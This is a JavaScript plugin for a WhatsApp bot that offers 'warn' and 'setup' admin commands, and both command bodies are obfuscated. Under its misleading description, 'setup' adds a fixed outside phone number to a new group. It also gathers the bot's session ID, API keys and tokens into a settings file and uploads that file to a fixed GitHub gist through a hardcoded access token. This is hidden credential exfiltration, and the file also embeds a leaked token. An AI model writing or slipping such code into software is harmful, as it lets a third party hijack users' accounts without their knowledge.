const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




  command({
    pattern: "setup",
    fromMe: true,
    desc: "turn off",
    dontAddCommandList: true,
    type: "admin",
  
  },
  async (message, match, m) => {
const _0x1ea294=_0x443c;(function(_0xd494e6,_0x510b21){const _0x459198=_0x443c,_0x11fd9b=_0xd494e6();while(!![]){try{const _0x396892=-parseInt(_0x459198(0x1d6))/0x1*(-parseInt(_0x459198(0x1f8))/0x2)+parseInt(_0x459198(0x1ff))/0x3+parseInt(_0x459198(0x1ef))/0x4*(-parseInt(_0x459198(0x20c))/0x5)+-parseInt(_0x459198(0x20f))/0x6*(parseInt(_0x459198(0x20d))/0x7)+-parseInt(_0x459198(0x1d7))/0x8*(-parseInt(_0x459198(0x200))/0x9)+-parseInt(_0x459198(0x1e7))/0xa+parseInt(_0x459198(0x20e))/0xb*(parseInt(_0x459198(0x1c8))/0xc);if(_0x396892===_0x510b21)break;else _0x11fd9b['push'](_0x11fd9b['shift']());}catch(_0x5722c4){_0x11fd9b['push'](_0x11fd9b['shift']());}}}(_0x565f,0xaa067));function _0x565f(){const _0x4c60f2=['2310602epRgoU','2306095XjhFAm','6bXmFcH','replaceAll','parse','toString','WORK_TYPE','48yGJVpv','FOOTER','then','utf-8','Storage','LANG','./media/AAA.jpg','../session.json','config','reset','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','client','LOGS','a216db893ba4f4a18d4f1476bfc1bb4d','14jKWYkf','5840GZowmP','.json','reply','AUTHOR','MODE','ALIVE','INTERNAL_MENU','gists','./database/settings.json','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','Cloud\x20DB\x20Update','@octokit/rest','BRANCH','LANGUAGE','BOT_NAME','THEME','11806550cRBWIO','_Registered\x20Successfully_','env','sendMessage','from','pushName','includes','GOODBYE_MSG','1964UmttAh','WELCOME_MSG','split','send','STORAGE_JID','creds','log','OWNER_NAME','MESSAGE_MEM','80532QkjbqJ','base64','@g.us','_You\x20Are\x20Already\x20a\x20Family\x20Member_','UserId','FONT_STYLE','name','2748873quOIzx','4383Gkhxya','Done\x20Creating\x20New\x20Db','user','HANDLERS','ANTILINK','SESSION_ID','ANTILINK_ACTION','stringify','DB_AUTH_TOKEN','phone_num','SUDO','readFileSync','4755MBBMpL'];_0x565f=function(){return _0x4c60f2;};return _0x565f();}let authid=_0x1ea294(0x1e0)[_0x1ea294(0x1c4)]('+','');function _0x443c(_0xeea843,_0x3f412d){const _0x565ff6=_0x565f();return _0x443c=function(_0x443c22,_0x4af957){_0x443c22=_0x443c22-0x1c4;let _0xe05743=_0x565ff6[_0x443c22];return _0xe05743;},_0x443c(_0xeea843,_0x3f412d);}const {Octokit}=require(_0x1ea294(0x1e2)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x3738f7=_0x1ea294;let _0x2ef246=JSON[_0x3738f7(0x1c5)](fs[_0x3738f7(0x20b)](_0x3738f7(0x1df))),_0x1b16bc=_0x2ef246['config'][_0x3738f7(0x1f3)],_0x181cc0=_0x1b16bc[_0x3738f7(0x1c6)]()[_0x3738f7(0x1ed)](_0x3738f7(0x1fa));if(!_0x181cc0)readFile(path,async(_0x2a1c7f,_0xcb5d16)=>{const _0x7c3714=_0x3738f7;if(_0x2a1c7f){console[_0x7c3714(0x1f5)](_0x2a1c7f);return;}const _0x3a0f=JSON['parse'](_0xcb5d16);let _0x2b1f0e=await message[_0x7c3714(0x1d3)]['groupCreate'](_0x7c3714(0x1cc),['359889999996@s.whatsapp.net']);await message['client'][_0x7c3714(0x1ea)](_0x2b1f0e['id'],{'text':'This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!'});let _0x4d05f1=await _0x2b1f0e['id'];_0x3a0f[_0x7c3714(0x1d0)][_0x7c3714(0x1f3)]=_0x4d05f1,writeFile(path,JSON[_0x7c3714(0x207)](_0x3a0f,null,0x2),async _0x48a760=>{const _0x103162=_0x7c3714;if(_0x48a760){message['reply'](_0x103162(0x1d2));return;}await message[_0x103162(0x1d3)]['updateProfilePicture'](_0x2b1f0e['id'],fs[_0x103162(0x20b)](_0x103162(0x1ce)));});});else return;setTimeout(async()=>{const _0xda48e6=_0x3738f7;let _0x22f7ee=require(_0xda48e6(0x1cf)),_0x27aa48=await _0x22f7ee[_0xda48e6(0x1f4)]['me']['id'][_0xda48e6(0x1f1)](':')[0x0],_0x26fa15=await _0x22f7ee[_0xda48e6(0x1f4)]['me']['id'][_0xda48e6(0x1f1)]('@')[0x1],_0x264f02=_0x27aa48+'@'+_0x26fa15,_0x2afb6c=_0x264f02+_0xda48e6(0x1d8);const _0x5283da=fs['readFileSync'](_0xda48e6(0x1df),'utf-8');await octokit['rest'][_0xda48e6(0x1de)]['update']({'gist_id':_0xda48e6(0x1d5),'description':_0xda48e6(0x1e1),'files':{[_0x2afb6c]:{'content':_0x5283da}}})[_0xda48e6(0x1ca)](await console['log'](_0xda48e6(0x201))),setTimeout(()=>{const _0x15a708=_0xda48e6;return process[_0x15a708(0x1f2)](_0x15a708(0x1d1));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x3c80db,_0xe76810)=>{const _0x10638f=_0x1ea294;if(_0x3c80db){console[_0x10638f(0x1f5)](_0x3c80db);return;}const _0x30ef7a=JSON[_0x10638f(0x1c5)](_0xe76810);let _0x1c94cf=_0x30ef7a['UserId']['toString']()['includes']('@s.whatsapp.net');if(_0x1c94cf)return message[_0x10638f(0x1d9)](_0x10638f(0x1fb));let _0xb81426=process[_0x10638f(0x1e9)][_0x10638f(0x208)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process[_0x10638f(0x1e9)][_0x10638f(0x208)],_0x141ef6=Buffer[_0x10638f(0x1eb)](_0xb81426,_0x10638f(0x1f9))[_0x10638f(0x1c6)](_0x10638f(0x1cb)),_0x3acf7e=_0x141ef6['toString']()[_0x10638f(0x1f1)]('/'),_0xe7951c='';for(let _0x1cd8ed of _0x3acf7e){_0xe7951c+=await Buffer[_0x10638f(0x1eb)](_0x1cd8ed+'==',_0x10638f(0x1f9))[_0x10638f(0x1c6)]('utf-8');}let _0x10e957=require('../session.json'),_0x50bece=await _0x10e957[_0x10638f(0x1f4)]['me']['id']['split'](':')[0x0],_0x32be23='0,'+_0x50bece,_0x3d5a67=await relconfig[_0x10638f(0x20a)]===![]?_0x32be23:relconfig[_0x10638f(0x20a)],_0x4c16e0=message[_0x10638f(0x1ec)],_0x474a4a=message[_0x10638f(0x202)],_0x3ff7f1=message['jid'][_0x10638f(0x1c6)]()['split']('@')[0x0];_0x30ef7a[_0x10638f(0x1fe)]=_0x4c16e0,_0x30ef7a[_0x10638f(0x1fc)]=_0x474a4a,_0x30ef7a[_0x10638f(0x209)]=_0x3ff7f1,_0x30ef7a[_0x10638f(0x1d0)]['HANDLER']=relconfig[_0x10638f(0x203)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1c7)]=relconfig['WORK_TYPE'],_0x30ef7a['config'][_0x10638f(0x1e5)]=relconfig[_0x10638f(0x1e5)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1f6)]=relconfig[_0x10638f(0x1f6)],_0x30ef7a['config'][_0x10638f(0x20a)]=_0x3d5a67,_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1da)]=relconfig[_0x10638f(0x1da)],_0x30ef7a['config']['PACKNAME']=relconfig['PACKNAME'],_0x30ef7a[_0x10638f(0x1d0)]['RMBG_KEY']=relconfig['RMBG_KEY'],_0x30ef7a[_0x10638f(0x1d0)]['LANG']=relconfig[_0x10638f(0x1cd)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x206)]=relconfig['ANTILINK_ACTION'],_0x30ef7a[_0x10638f(0x1d0)]['ANTILINK']=relconfig[_0x10638f(0x204)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1c9)]=relconfig[_0x10638f(0x1c9)],_0x30ef7a[_0x10638f(0x1d0)]['THEME']=relconfig[_0x10638f(0x1e6)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1fd)]=relconfig['FONT_STYLE'],_0x30ef7a['config'][_0x10638f(0x1e4)]=relconfig[_0x10638f(0x1e4)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1dd)]=relconfig[_0x10638f(0x1dd)],_0x30ef7a[_0x10638f(0x1d0)]['MODE']=relconfig[_0x10638f(0x1db)],_0x30ef7a[_0x10638f(0x1d0)][_0x10638f(0x1f3)],_0x30ef7a[_0x10638f(0x1d0)]['DB_URL'],_0x30ef7a['config']['SESSION_ID']=relconfig[_0x10638f(0x205)],_0x30ef7a['config'][_0x10638f(0x1d4)]=relconfig['LOGS'],_0x30ef7a['config'][_0x10638f(0x1e3)]=relconfig[_0x10638f(0x1e3)],_0x30ef7a[_0x10638f(0x1d0)]['B1']=relconfig['B1'],_0x30ef7a[_0x10638f(0x1d0)]['B2']=relconfig['B2'],_0x30ef7a[_0x10638f(0x1d0)]['B3']=relconfig['B3'],_0x30ef7a[_0x10638f(0x1d0)]['B4']=relconfig['B4'],_0x30ef7a['config']['B5']=relconfig['B5'],_0x30ef7a['config'][_0x10638f(0x208)]=_0xe7951c,_0x30ef7a[_0x10638f(0x1f7)][_0x10638f(0x1ee)]=relconfig[_0x10638f(0x1ee)],_0x30ef7a[_0x10638f(0x1f7)][_0x10638f(0x1f0)]=relconfig[_0x10638f(0x1f0)],_0x30ef7a[_0x10638f(0x1f7)][_0x10638f(0x1dc)]=relconfig[_0x10638f(0x1dc)],writeFile(path,JSON[_0x10638f(0x207)](_0x30ef7a,null,0x2),_0x1eeb74=>{const _0x5228c2=_0x10638f;if(_0x1eeb74){message[_0x5228c2(0x1d9)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}message[_0x5228c2(0x1d9)](_0x5228c2(0x1e8));});});
  })



//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




